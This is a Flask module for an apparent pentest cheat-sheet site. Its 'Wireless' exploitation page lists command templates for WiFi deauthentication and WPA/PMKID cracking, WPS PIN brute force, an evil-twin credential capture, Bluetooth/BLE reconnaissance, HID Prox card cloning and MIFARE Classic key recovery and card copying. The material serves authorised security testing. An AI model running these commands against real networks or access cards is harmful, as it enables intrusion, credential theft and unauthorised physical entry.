from flask import Blueprint, render_template

bp = Blueprint("wireless", __name__)

WIFI = [
    {"title": "Interface / monitor mode", "blocks": [
        {"tpl": "iwconfig; ip link"},
        {"tpl": "airmon-ng check kill"},
        {"tpl": "airmon-ng start wlan0"},
        {"tpl": "iw dev wlan0 set type monitor && ip link set wlan0 up", "lbl": "manual"},
    ]},
    {"title": "Discover networks / clients", "blocks": [
        {"tpl": "airodump-ng wlan0mon"},
        {"tpl": "airodump-ng -c <ch> --bssid <AP> -w cap wlan0mon", "lbl": "target one AP"},
    ]},
    {"title": "WPA handshake capture", "blocks": [
        {"tpl": "aireplay-ng -0 5 -a <AP> -c <CLIENT> wlan0mon", "lbl": "deauth to force handshake"},
        {"tpl": "aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap"},
    ]},
    {"title": "PMKID (clientless)", "blocks": [
        {"tpl": "hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1"},
        {"tpl": "hcxpcapngtool -o hash.hc22000 pmkid.pcapng"},
        {"tpl": "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt"},
    ]},
    {"title": "Automated / WPS / Evil twin", "blocks": [
        {"tpl": "wifite --kill"},
        {"tpl": "reaver -i wlan0mon -b <AP> -vv", "lbl": "WPS pin"},
        {"tpl": "eaphammer --cert-wizard && eaphammer -i wlan0 --essid <name> --creds", "lbl": "evil twin / creds"},
    ]},
]

BLUETOOTH = [
    {"title": "Adapter / classic scan", "blocks": [
        {"tpl": "hciconfig -a; hciconfig hci0 up"},
        {"tpl": "hcitool scan", "lbl": "classic discovery"},
        {"tpl": "hcitool inq; sdptool browse <MAC>", "lbl": "services"},
        {"tpl": "l2ping -c 4 <MAC>", "lbl": "reachability / L2CAP"},
    ]},
    {"title": "bluetoothctl", "blocks": [
        {"tpl": "bluetoothctl"},
        {"tpl": "scan on"},
        {"tpl": "pair <MAC>; connect <MAC>", "plain": True},
    ]},
    {"title": "BLE (Low Energy)", "blocks": [
        {"tpl": "bettercap -eval 'ble.recon on'"},
        {"tpl": "sudo hcitool lescan"},
        {"tpl": "gatttool -b <MAC> -I", "lbl": "enumerate GATT services"},
        {"tpl": "sudo bleah -b <MAC>", "lbl": "BLE smart scanner"},
    ]},
    {"title": "Attacks / notes", "hint": "Sniffing BLE usually needs an Ubertooth or nRF dongle.", "blocks": [
        {"tpl": "ubertooth-btle -f -c pipe.pcap", "lbl": "sniff BLE -> wireshark"},
        {"tpl": "# BlueBorne / KNOB / BLESA are CVE-based; check firmware & stack versions", "plain": True},
    ]},
]

RFID = [
    {"title": "Proxmark3 basics", "blocks": [
        {"tpl": "pm3"},
        {"tpl": "hw tune", "lbl": "check antenna / field"},
        {"tpl": "auto", "lbl": "auto-detect card on field"},
    ]},
    {"title": "Low frequency (125 kHz)", "blocks": [
        {"tpl": "lf search"},
        {"tpl": "lf hid read", "lbl": "HID Prox"},
        {"tpl": "lf em 410x reader"},
        {"tpl": "lf hid clone -r <id>", "lbl": "clone to T5577"},
    ]},
    {"title": "High frequency (13.56 MHz)", "blocks": [
        {"tpl": "hf search"},
        {"tpl": "hf 14a info", "lbl": "ISO14443-A / MIFARE"},
        {"tpl": "hf mf autopwn", "lbl": "nested/darkside/hardnested keys + dump"},
        {"tpl": "hf mf chk *1 ? d", "lbl": "default key check"},
    ]},
    {"title": "MIFARE Classic (libnfc)", "blocks": [
        {"tpl": "nfc-list"},
        {"tpl": "mfoc -O dump.mfd", "lbl": "crack via known key (nested)"},
        {"tpl": "mfcuk -C -R 0:A -s 0 -S 0", "lbl": "darkside when no known key"},
        {"tpl": "nfc-mfclassic w a dump.mfd blank.mfd", "lbl": "write to magic card"},
    ]},
]

TABS = [("wifi", "Wifi", WIFI), ("bluetooth", "Bluetooth", BLUETOOTH), ("rfid", "RFID", RFID)]


@bp.route("/wireless")
def index():
    return render_template("wireless.html", active="wireless",
                           title="Wireless", tag="exploitation", tabs=TABS)


MODULE = {"id": "wireless", "title": "Wireless", "category": "Exploitation",
          "order": 4, "blueprint": bp, "endpoint": "wireless.index"}
